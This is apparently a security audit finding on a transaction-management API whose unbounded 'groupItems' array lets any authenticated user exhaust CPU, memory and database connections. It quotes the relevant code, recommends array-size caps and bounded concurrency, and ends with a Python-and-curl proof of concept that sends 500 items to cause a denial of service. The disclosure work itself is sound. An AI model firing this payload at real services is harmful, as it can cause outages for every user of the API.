### Title
Unbounded `groupItems` Array in `POST /transaction-groups` Enables Authenticated DoS via Resource Exhaustion

### Summary
The `CreateTransactionGroupDto` places no upper bound on the `groupItems` array. When `createTransactionGroup` is called, it fans out all N items into a single `Promise.all` of concurrent `validateAndPrepareTransaction` calls — each performing SDK deserialization, cryptographic signature verification, and network-client operations — before committing all N records in one database transaction. Any authenticated user can submit one crafted request with thousands of items to exhaust server CPU, memory, and database connections, degrading service for all other users. The developers themselves flagged the missing limit in a code comment on the analogous `importSignatures` path.

### Finding Description

**Root cause — no `@ArrayMaxSize()` on `groupItems`:**

`CreateTransactionGroupDto` accepts an unbounded array:

```typescript
// back-end/apps/api/src/transactions/dto/create-transaction-group.dto.ts
@IsArray()
@IsNotEmpty()
@ValidateNested({ each: true })
@Type(() => CreateTransactionGroupItemDto)
groupItems: CreateTransactionGroupItemDto[];   // ← no @ArrayMaxSize()
``` [1](#0-0) 

**Exploit path — `Promise.all` over N concurrent heavy operations:**

`createTransactionGroup` extracts all N transaction DTOs and passes them to `createTransactions`:

```typescript
// back-end/apps/api/src/transactions/groups/transaction-groups.service.ts
const transactionDtos = dto.groupItems.map(item => item.transaction);
const transactions = await this.transactionsService.createTransactions(transactionDtos, user);
``` [2](#0-1) 

`createTransactions` then fans out all N validations **concurrently** via `Promise.all`:

```typescript
// back-end/apps/api/src/transactions/transactions.service.ts
const validatedData = await Promise.all(
  dtos.map(dto => this.validateAndPrepareTransaction(dto, user, client)),
);
``` [3](#0-2) 

Each `validateAndPrepareTransaction` call performs:
- `SDKTransaction.fromBytes()` — protobuf deserialization
- `PublicKey.verify()` — elliptic-curve signature verification (CPU-intensive)
- `isTransactionBodyOverMaxSize()` — second deserialization pass

All N results are then saved inside a single database transaction, holding a DB connection for the full duration.

**Developer acknowledgment of the missing limit** on the analogous `importSignatures` path:

```typescript
//Added a batch mechanism, probably should limit this on the api side of things
const BATCH_SIZE = 500;
``` [4](#0-3) 

The same unbounded-array pattern exists on `POST /transactions/signatures/import` (`importSignatures`) and `POST /transactions/signers` (`uploadSignatureMaps`), both of which accept `UploadSignatureMapDto | UploadSignatureMapDto[]` with no array-size cap. [5](#0-4) [6](#0-5) 

### Impact Explanation
A single authenticated user (no admin role required) can submit one HTTP request to `POST /transaction-groups` with thousands of `groupItems`. The server spawns N concurrent CPU-heavy crypto operations via `Promise.all`, exhausting the Node.js event loop and available memory. The long-running database transaction also holds a PostgreSQL connection for the full duration, starving the connection pool. The result is severe response-time degradation or an OOM crash affecting all concurrent users of the API service. Because the attack requires only a valid JWT (obtainable by any registered user), the blast radius is the entire organization's API tier.

### Likelihood Explanation
The attacker precondition is a valid user account — the lowest privilege level in the system. The endpoint is reachable over HTTPS with no additional guards beyond `JwtAuthGuard` and `VerifiedUserGuard`. No rate-limiting or body-size enforcement beyond the default Express 100 KB limit is present; even within that limit, ~100–150 items each requiring elliptic-curve verification is sufficient to cause measurable latency spikes. The attack is a single crafted POST request and requires no special tooling.

### Recommendation
1. Add `@ArrayMaxSize(N)` (e.g., `N = 50`) to `groupItems` in `CreateTransactionGroupDto`.
2. Apply the same cap to the `UploadSignatureMapDto[]` body accepted by `POST /transactions/signers` and `POST /transactions/signatures/import`.
3. Replace the `Promise.all` fan-out in `createTransactions` with a bounded concurrency pattern (e.g., process items in chunks of a fixed size) to prevent a single request from monopolising the event loop even within the allowed limit.

### Proof of Concept

```bash
# Attacker holds a valid JWT (normal user account)
TOKEN="<valid_jwt>"

# Build a payload with 500 groupItems, each containing a minimal valid transaction
python3 -c "
import json, sys
item = {
  'seq': 0,
  'transaction': {
    'name': 'x',
    'description': '',
    'transactionBytes': '<hex_encoded_valid_sdk_tx>',
    'mirrorNetwork': 'testnet',
    'signature': '<valid_creator_sig>',
    'creatorKeyId': 1
  }
}
payload = {
  'description': 'dos',
  'atomic': False,
  'sequential': False,
  'groupItems': [dict(item, seq=i) for i in range(500)]
}
print(json.dumps(payload))
" > payload.json

curl -X POST https://<api-host>/transaction-groups \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d @payload.json
```

**Expected outcome:** The server spawns 500 concurrent `validateAndPrepareTransaction` calls (each performing elliptic-curve verification), saturating the Node.js event loop. Concurrent legitimate requests experience severe latency or timeout. Repeating the request a few times causes OOM or process crash.

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction-group.dto.ts (L24-28)
```typescript
  @IsArray()
  @IsNotEmpty()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionGroupItemDto)
  groupItems: CreateTransactionGroupItemDto[];
```

**File:** back-end/apps/api/src/transactions/groups/transaction-groups.service.ts (L47-53)
```typescript
    const transactionDtos = dto.groupItems.map(item => item.transaction);

    // Batch create all transactions
    const transactions = await this.transactionsService.createTransactions(
      transactionDtos,
      user,
    );
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L409-411)
```typescript
      const validatedData = await Promise.all(
        dtos.map(dto => this.validateAndPrepareTransaction(dto, user, client)),
      );
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L575-576)
```typescript
    //Added a batch mechanism, probably should limit this on the api side of things
    const BATCH_SIZE = 500;
```

**File:** back-end/apps/api/src/transactions/transactions.controller.ts (L96-107)
```typescript
  async importSignatures(
    @Body() body: UploadSignatureMapDto[] | UploadSignatureMapDto,
    @GetUser() user: User,
  ): Promise<SignatureImportResultDto[]> {
    const transformedSignatureMaps = await transformAndValidateDto(
      UploadSignatureMapDto,
      body
    );

    // Delegate to service to perform the import
    return this.transactionsService.importSignatures(transformedSignatureMaps, user);
  }
```

**File:** back-end/apps/api/src/transactions/signers/signers.controller.ts (L100-119)
```typescript
  @Post()
  @HttpCode(201)
  async uploadSignatureMap(
    @Body() body: UploadSignatureMapDto | UploadSignatureMapDto[],
    @GetUser() user: User,
    @Query('includeNotifications') includeNotifications?: boolean,
  ): Promise<TransactionSigner[] | UploadSignatureMapResponseDto> {
    const transformedSignatureMaps = await transformAndValidateDto(UploadSignatureMapDto, body);

    const { signers, notificationReceiverIds } = await this.signaturesService.uploadSignatureMaps(
      transformedSignatureMaps,
      user,
    );

    if (includeNotifications) {
      return { signers, notificationReceiverIds };
    }

    return signers;
  }
```
